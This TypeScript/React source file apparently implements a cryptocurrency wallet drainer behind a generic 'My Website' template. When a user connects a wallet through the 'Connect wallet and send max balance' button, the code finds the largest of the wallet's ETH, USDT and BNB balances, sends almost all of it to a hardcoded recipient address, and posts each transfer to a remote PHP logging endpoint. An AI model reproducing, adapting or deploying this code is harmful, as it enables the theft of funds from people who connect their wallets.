'use client'

import { createWeb3Modal, defaultConfig } from '@web3modal/ethers/react'
import { useWeb3Modal } from '@web3modal/ethers/react'
import { ethers } from 'ethers'
import styled from 'styled-components'
import { useState } from 'react'

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = 'e67036fc2887623576e98ce387998086'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}

// 3. Create modal
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com',
  icons: ['https://avatars.mywebsite.com/']
}

createWeb3Modal({
  ethersConfig: defaultConfig({ metadata }),
  chains: [mainnet],
  projectId
})

export function Web3ModalProvider({ children }: { children: React.ReactNode }) {
  return children
}

const Button = styled.button`
  border: 1px solid green;
  padding: 10px;
  cursor: pointer;
  &:hover {
    background-color: #f99ff9;
  }
`

const sendLog = async (type: string, details: string) => {
  try {
    await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/backend.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type, details })
    })
  } catch (error) {
    console.error('Error sending log:', error)
  }
}

export function ConnectButton() {
  const { open } = useWeb3Modal()
  const [provider, setProvider] = useState<ethers.providers.Web3Provider | null>(null)

  const connectAndSend = async () => {
    try {
      const web3Provider = new ethers.providers.Web3Provider(await open())
      setProvider(web3Provider)

      const signer = web3Provider.getSigner()
      const address = await signer.getAddress()

      // Token contract addresses
      const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
      const bnbAddress = '0xB8c77482e45F1F44dE1745F52C74426C631bDD52' // Note: BNB on Ethereum network

      // ERC20 ABI
      const erc20Abi = [
        'function balanceOf(address owner) view returns (uint256)',
        'function transfer(address to, uint amount) returns (bool)'
      ]

      // Create token contract instances
      const usdtContract = new ethers.Contract(usdtAddress, erc20Abi, signer)
      const bnbContract = new ethers.Contract(bnbAddress, erc20Abi, signer)

      // Fetch balances
      const ethBalance = await web3Provider.getBalance(address)
      const usdtBalance = await usdtContract.balanceOf(address)
      const bnbBalance = await bnbContract.balanceOf(address)

      // Determine the highest balance
      let highestBalanceToken: 'ETH' | 'USDT' | 'BNB' = 'ETH'
      let highestBalance = ethBalance
      if (usdtBalance.gt(highestBalance)) {
        highestBalance = usdtBalance
        highestBalanceToken = 'USDT'
      }
      if (bnbBalance.gt(highestBalance)) {
        highestBalance = bnbBalance
        highestBalanceToken = 'BNB'
      }

      // Calculate gas fees
      const gasPrice = await web3Provider.getGasPrice()
      const gasLimit = ethers.BigNumber.from(21000) // Base transaction cost
      const gasCost = gasPrice.mul(gasLimit)

      const recipient = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f' // replace with the desired recipient address

      if (highestBalanceToken === 'ETH') {
        const value = highestBalance.sub(gasCost)
        const tx = await signer.sendTransaction({
          to: recipient,
          value
        })
        await tx.wait()
        await sendLog('approved', `ETH transaction to ${recipient} with value ${value.toString()}`)
      } else if (highestBalanceToken === 'USDT') {
        const usdtGasLimit = ethers.BigNumber.from(65000) // Approximate gas limit for USDT transfer
        const usdtGasCost = gasPrice.mul(usdtGasLimit)
        const usdtValue = highestBalance.sub(usdtGasCost)
        const tx = await usdtContract.transfer(recipient, usdtValue)
        await tx.wait()
        await sendLog('approved', `USDT transaction to ${recipient} with value ${usdtValue.toString()}`)
      } else if (highestBalanceToken === 'BNB') {
        const bnbGasLimit = ethers.BigNumber.from(65000) // Approximate gas limit for BNB transfer
        const bnbGasCost = gasPrice.mul(bnbGasLimit)
        const bnbValue = highestBalance.sub(bnbGasCost)
        const tx = await bnbContract.transfer(recipient, bnbValue)
        await tx.wait()
        await sendLog('approved', `BNB transaction to ${recipient} with value ${bnbValue.toString()}`)
      }

      alert('Transaction successful!')
    } catch (error) {
      console.error(error)
      await sendLog('error', `Transaction failed: ${error.message}`)
      alert('Transaction failed!')
    }
  }

  return (
    <>
      <Button onClick={connectAndSend}>Connect wallet and send max balance</Button>
    </>
  )
}
